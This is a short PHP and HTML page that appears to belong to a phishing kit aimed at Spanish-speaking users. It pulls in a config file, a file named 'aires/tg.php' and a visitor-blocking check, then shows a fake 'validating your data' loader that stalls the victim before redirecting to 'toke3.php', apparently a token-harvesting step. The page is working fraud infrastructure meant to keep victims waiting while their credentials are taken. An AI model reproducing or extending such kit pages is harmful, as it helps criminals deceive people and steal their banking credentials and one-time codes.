<?php
include './config.php';
include './aires/tg.php';
if ($blocker == false){
   include './sistema/view.php';
 }
?><!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="./new/main-responsive.css" rel="stylesheet">
</head>

<body>
    <div class="container">
        <div class="loader"></div>
        <div class="loading-text">Por favor espere, estamos validando sus datos</div>
    </div>
    <script>
        let messages = [
            "Por favor espere, está siendo redirigido",  
        ];
        let count = 0
        let counter = setInterval(function () {
            count++;
            if (count === 10) {
                clearInterval(counter);
                window.location.href = "toke3.php";
            }
            document.querySelector(".loading-text").innerHTML = messages[count % messages.length];
        }, 10000 );
    </script>
</body>

</html>